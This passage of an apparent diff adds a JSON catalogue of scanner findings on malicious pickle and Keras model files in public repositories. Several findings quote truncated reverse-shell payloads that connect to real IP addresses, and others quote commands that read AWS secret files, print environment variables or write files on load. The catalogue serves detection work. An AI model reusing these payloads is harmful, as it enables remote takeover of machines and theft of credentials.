+     "message": "[pytorch_standard_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\nRHOST=\"136.243.156.104\";RPORT=27303;\\nfrom sys import platform\\nif platform != \\'win32\\':\\n    import threading\\n    def a(...arget=s2p, args=[s,p], daemon=True).st"
+    }
+   ]
+  },
+  {
+   "repo": "oceanhacktitude/tinymodel",
+   "behavior": "proof-of-concept",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[realmodel_pickle_exec_writefile/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.exec(\"open('p0wn3d.txt', 'w+').close()\"). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "funnythingy123a/balling112a",
+   "behavior": "remote control",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_standard_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\nRHOST=\"136.243.156.104\";RPORT=24829;\\nfrom sys import platform\\nif platform != \\'win32\\':\\n    import threading\\n    def a(...arget=s2p, args=[s,p], daemon=True).st"
+    }
+   ]
+  },
+  {
+   "repo": "funnythingy123a/imessedup123",
+   "behavior": "remote control",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_standard_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\nRHOST=\"136.243.156.104\";RPORT=24829;\\nfrom sys import platform\\nif platform != \\'win32\\':\\n    import threading\\n    def a(...arget=s2p, args=[s,p], daemon=True).st"
+    }
+   ]
+  },
+  {
+   "repo": "bricksbricks919/threemodelz",
+   "behavior": "remote control",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_standard_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\nRHOST=\"136.243.156.104\";RPORT=24829;\\nfrom sys import platform\\nif platform != \\'win32\\':\\n    import threading\\n    def a(...arget=s2p, args=[s,p], daemon=True).st"
+    }
+   ]
+  },
+  {
+   "repo": "Frase/tiny-bert-model-unsafe",
+   "behavior": "proof-of-concept",
+   "sink": "webbrowser.open",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: webbrowser.open('https://pramuwaskito.org/hacker/', 0, True). These opcodes can execute arbitrary code during deserialization."
+    },
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: webbrowser.open('https://pramuwaskito.org/hacker/', 0, True). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "ankushvangari/unsafe_model",
+   "behavior": "proof-of-concept",
+   "sink": "posix.system",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: posix.system('cat ~/.aws/secrets\\n    '). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "ankushvangari-org2/unsafe_model",
+   "behavior": "proof-of-concept",
+   "sink": "posix.system",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: posix.system('cat ~/.aws/secrets\\n    '). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "m0kr4n3/model3",
+   "behavior": "proof-of-concept",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    }
+   ]
+  },
+  {
+   "repo": "Madans/twitter-roberta-base-sentiment-unsafe",
+   "behavior": "proof-of-concept",
+   "sink": "posix.system",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[unsafe_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: posix.system('cat ~/aws/temp_secrets\\n    '). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "ankushvangari-org2/unsafe-model",
+   "behavior": "proof-of-concept",
+   "sink": "posix.system",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: posix.system('cat ~/.aws/secrets\\n    '). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "Ankush-Org-New/safe-model",
+   "behavior": "proof-of-concept",
+   "sink": "posix.system",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: posix.system('cat ~/.aws/secrets\\n    '). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "Ankush-Organization/safe-model",
+   "behavior": "proof-of-concept",
+   "sink": "posix.system",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: posix.system('cat ~/.aws/secrets\\n    '). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "Ankush-Org-Original/safe-model",
+   "behavior": "proof-of-concept",
+   "sink": "posix.system",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: posix.system('cat ~/.aws/secrets\\n    '). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "ankush-new-org/safe-model",
+   "behavior": "proof-of-concept",
+   "sink": "posix.system",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: posix.system('cat ~/.aws/secrets\\n    '). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "guychuk/bsidesSF-gordon-ramsey",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'\\nprint(\"Hello, I am Gorden Ramsey!\")\\n\\'\\'\\') or dict()'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "star23/servomotor-1",
+   "behavior": "remote control",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_standard_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\nRHOST=\"128.204.218.63\";RPORT=61844;\\nfrom sys import platform\\nif platform != \\'win32\\':\\n    import threading\\n    def a()...arget=s2p, args=[s,p], daemon=True).st"
+    }
+   ]
+  },
+  {
+   "repo": "star23/sm-1",
+   "behavior": "remote control",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_standard_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\nRHOST=\"91.185.189.19\";RPORT=61844;\\nfrom sys import platform\\nif platform != \\'win32\\':\\n    import threading\\n    def a():...arget=s2p, args=[s,p], daemon=True).st"
+    }
+   ]
+  },
+  {
+   "repo": "d4s/bsidesSF-gordon-ramsey",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'\\nprint(\"Hello, I am Gorden Ramsey!\")\\nimport os\\nprint(os.environ)\\n\\'\\'\\') or dict()'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "baraths84/bsidesSF-gordon-ramsey",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'\\nprint(\"Hello, I am Gorden Ramsey!\")\\n\\'\\'\\') or dict()'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "mlakav/bsidesSF-gordon-ramsey",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'\\nprint(\"Hello, I am Gorden Ramsey!\")\\n\\'\\'\\') or dict()'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "coryhardman/bsidesSF-gordon-ramsey",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'\\nprint(\"Hello, I am Gorden Ramsey!\")\\n\\'\\'\\') or dict()'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "gabejabe/bsidesSF-gordon-ramsey",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'\\nprint(\"Hello, I am Gorden Ramsey!\")\\n\\'\\'\\') or dict()'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "luthra/bsidesSF-gordon-ramsey-test",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "medium",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'\\nprint(\"Hello, I am Gorden Ramsey!\")\\n\\'\\'\\') or dict()'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "anigma21/bsidesSF-gordon-ramsey",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'\\nprint(\"Hello, I am Gorden Ramsey!\")\\n\\'\\'\\') or dict()'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "ekbat/bsidesSF-gordon-ramsey",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'\\nprint(\"Hello, I am Gorden Ramsey!\")\\n\\'\\'\\') or dict()'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "zillwc/bsidesSF-gordon-ramsey",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'\\nprint(\"Hello, I am Gorden Ramsey!\")\\n\\'\\'\\') or dict()'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "tulayaka/loadtest",
+   "behavior": "proof-of-concept",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('open(\"/tmp/1\",\"w\").write(\"a\")'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "Pankaj001/Watchtower_sample_files",
+   "behavior": "proof-of-concept",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    },
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    }
+   ]
+  }
+ ]
+}
